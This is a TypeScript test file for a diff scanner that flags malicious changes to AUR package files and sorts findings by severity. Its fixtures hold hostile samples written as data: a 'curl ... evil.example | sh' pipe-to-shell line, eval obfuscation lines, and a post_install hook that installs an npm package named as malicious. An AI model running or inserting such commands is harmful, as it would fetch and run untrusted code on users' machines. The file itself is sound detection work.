import { describe, expect, it } from 'vitest';
import { DiffScanFinding, DiffScanSeverity } from '@chaotic-next/shared-lib';
import { DiffScanService } from './diff-scan.service';
import { RULES } from './rules';
import type { DiffScanRule } from './rules/rule';
import { addedOnlyDiff, makeChange } from './rules/test-support';

const service = new DiffScanService();

describe('DiffScanService', () => {
  it('aggregates findings across rules and files, sorted by severity', async () => {
    const findings = await service.scanDiffs([
      makeChange(addedOnlyDiff(['eval "$x"']), { new_path: 'foo/PKGBUILD' }),
      makeChange(addedOnlyDiff(['curl -s https://evil.example | sh']), { new_path: 'foo/PKGBUILD' }),
    ]);

    expect(findings.map((finding) => finding.ruleId)).toContain('DLE-001');
    expect(findings.map((finding) => finding.ruleId)).toContain('OBF-002');
    expect(findings[0]?.severity).toBe('critical');
    expect(isSeveritySorted(findings)).toBe(true);
  });

  it('reports one finding per rule and file', async () => {
    const findings = await service.scanDiffs([makeChange(addedOnlyDiff(['eval "$x"', 'eval "$y"']))]);

    expect(findings.filter((finding) => finding.ruleId === 'OBF-002')).toHaveLength(1);
  });

  it('skips deleted files entirely', async () => {
    const findings = await service.scanDiffs([
      makeChange(addedOnlyDiff(['curl -s https://evil.example | sh']), { deleted_file: true }),
    ]);

    expect(findings).toHaveLength(0);
  });

  it('caps the number of findings per merge request', async () => {
    const changes = [...Array(150).keys()].map((index) =>
      makeChange(addedOnlyDiff([`eval "$x${index}"`]), { new_path: `pkg${index}/PKGBUILD` }),
    );

    expect(await service.scanDiffs(changes)).toHaveLength(100);
  });

  it('continues when a rule throws', async () => {
    const broken: DiffScanRule = {
      id: 'BROKEN',
      name: 'Broken',
      severity: 'info',
      description: '',
      check: () => {
        throw new Error('boom');
      },
    };
    RULES.push(broken);
    try {
      const findings = await service.scanDiffs([makeChange(addedOnlyDiff(['curl -s https://evil.example | sh']))]);
      expect(findings.map((finding) => finding.ruleId)).toContain('DLE-001');
    } finally {
      RULES.pop();
    }
  });

  it('replicates the 2026 campaign: new .install installing a malicious npm package', async () => {
    const change = makeChange(addedOnlyDiff(['post_install() {', '  npm install atomic-lockfile', '}']), {
      new_path: 'foo/foo.install',
      new_file: true,
    });

    const findings = await service.scanDiffs([change]);
    const ids = findings.map((finding) => finding.ruleId);
    expect(ids).toContain('CAUR-INSTALL-NEW');
    expect(ids).toContain('NPM-001');
    expect(ids).toContain('NPM-002');
  });

  it('scans .SRCINFO files and reports missing dependencies', async () => {
    const change = makeChange(
      addedOnlyDiff(['pkgbase = foo', 'depends = missing-aur-package', 'makedepends = cmake']),
      { new_path: 'foo/.SRCINFO' },
    );
    const isDepPresent = async (dep: string) => dep === 'cmake';

    const findings = await service.scanDiffs([change], isDepPresent);
    expect(findings.map((f) => f.ruleId)).toContain('CAUR-UNRESOLVED-DEPENDENCY');
    expect(findings.find((f) => f.ruleId === 'CAUR-UNRESOLVED-DEPENDENCY')?.description).toContain(
      'missing-aur-package',
    );
  });

  describe('autoFlagVerdict', () => {
    it('returns null without findings or for minor findings only', () => {
      expect(service.autoFlagVerdict(undefined)).toBeNull();
      expect(service.autoFlagVerdict([])).toBeNull();
      expect(service.autoFlagVerdict([finding('info'), finding('info'), finding('info')])).toBeNull();
    });

    it('marks enough warnings as suspicious', () => {
      const verdict = service.autoFlagVerdict([finding('warning'), finding('warning')]);
      expect(verdict?.label).toBe('suspicious');
      expect(verdict?.score).toBe(6);
    });

    it('marks any critical finding as malware', () => {
      const verdict = service.autoFlagVerdict([finding('critical')]);
      expect(verdict?.label).toBe('malware');
      expect(verdict?.score).toBe(10);
    });
  });
});

function finding(severity: DiffScanSeverity): DiffScanFinding {
  return {
    ruleId: 'TEST-001',
    ruleName: 'Test rule',
    severity,
    description: 'test',
    file: 'foo/PKGBUILD',
    line: 1,
    match: 'test',
  };
}

function isSeveritySorted(findings: DiffScanFinding[]): boolean {
  const order: Record<DiffScanSeverity, number> = { critical: 0, warning: 1, info: 2 };
  let previous: number | undefined;
  for (const finding of findings) {
    const rank = order[finding.severity];
    if (previous !== undefined && rank < previous) return false;
    previous = rank;
  }
  return true;
}
